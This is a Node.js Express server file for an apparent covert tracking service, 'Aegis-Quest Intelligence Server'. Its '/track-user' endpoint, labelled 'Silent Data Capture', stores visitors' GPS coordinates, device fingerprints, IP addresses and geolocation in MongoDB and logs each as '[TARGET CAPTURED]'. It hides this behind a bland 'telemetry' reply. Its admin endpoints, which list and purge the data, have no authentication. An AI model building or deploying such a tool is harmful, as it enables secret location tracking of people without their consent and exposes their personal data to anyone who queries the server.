const express = require('express');
const cors = require('cors');
const { MongoClient, ServerApiVersion, ObjectId } = require('mongodb');
const geoip = require('geoip-lite');
require('dotenv').config();

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());

// MongoDB Connection URI (Using Environment Variable)
const uri = process.env.MONGODB_URI;

const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

async function run() {
  try {
    // Database and Collection setup
    const db = client.db("aegisQuest");
    const logsCollection = db.collection("capturedLogs");

    console.log("Connecting to MongoDB...");

    /**
     * 1. Enhanced Silent Data Capture API
     */
    app.post('/track-user', async (req, res) => {
        try {
            const { coords, device } = req.body;
            
            let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
            if (ip === '::1' || ip === '127.0.0.1') {
                ip = "103.147.218.154"; // Fallback for local testing
            }

            const geo = geoip.lookup(ip);

            const finalData = {
                coords: coords || { lat: 23.6850, lng: 90.3563 }, 
                device: {
                    os: device?.os || "Unknown OS",
                    osVersion: device?.osVersion || "N/A",
                    browser: device?.browser || "Unknown Browser",
                    browserVersion: device?.browserVersion || "N/A",
                    type: device?.type || "Desktop",
                    vendor: device?.vendor || "Generic",
                    model: device?.model || "PC",
                    cpu: device?.cpu || "N/A",
                    resolution: device?.resolution || "Unknown"
                },
                ip: ip,
                approximateCity: geo ? geo.city : "Dhaka",
                approximateCountry: geo ? geo.country : "BD",
                timezone: geo ? geo.timezone : "Asia/Dhaka",
                receivedAt: new Date().toISOString(),
                displayTime: new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })
            };

            const result = await logsCollection.insertOne(finalData);
            console.log(`[TARGET CAPTURED] IP: ${ip} | City: ${finalData.approximateCity}`);
            
            res.status(201).send({ 
                success: true, 
                id: result.insertedId,
                message: "Telemetry synchronized successfully." 
            });

        } catch (error) {
            console.error("Tracking Error:", error);
            res.status(500).send({ success: false, message: "Internal server error" });
        }
    });

    /**
     * 2. Fetch Admin Logs
     */
    app.get('/admin-data', async (req, res) => {
      try {
        const result = await logsCollection.find().sort({ _id: -1 }).toArray();
        res.send(result);
      } catch (error) {
        res.status(500).send({ message: "Failed to fetch logs" });
      }
    });

    /**
     * 3. Delete Log API
     */
    app.delete('/admin-data/:id', async (req, res) => {
      try {
          const id = req.params.id;
          const query = { _id: new ObjectId(id) };
          const result = await logsCollection.deleteOne(query);
          
          if (result.deletedCount === 1) {
              res.status(200).send({ success: true, message: "Log deleted successfully" });
          } else {
              res.status(404).send({ success: false, message: "Log not found" });
          }
      } catch (error) {
          res.status(500).send({ success: false, message: "Internal server error" });
      }
    });


    // 4. Purge All Logs
    app.delete('/admin-data-purge', async (req, res) => {
        try {
            const result = await logsCollection.deleteMany({});
            res.status(200).send({ 
                success: true, 
                deletedCount: result.deletedCount,
                message: "All logs have been cleared successfully." 
            });
        } catch (error) {
            res.status(500).send({ success: false, message: "Internal server error" });
        }
    });

    app.get('/', (req, res) => {
      res.send('Aegis-Quest Intelligence Server is Active.');
    });

    console.log("Successfully connected to MongoDB!");

  } catch (error) {
    console.error("MongoDB Connection Failed:", error);
  }
}

run().catch(console.dir);

app.listen(port, () => {
  console.log(`Server is running on: http://localhost:${port}`);
});
module.exports = app;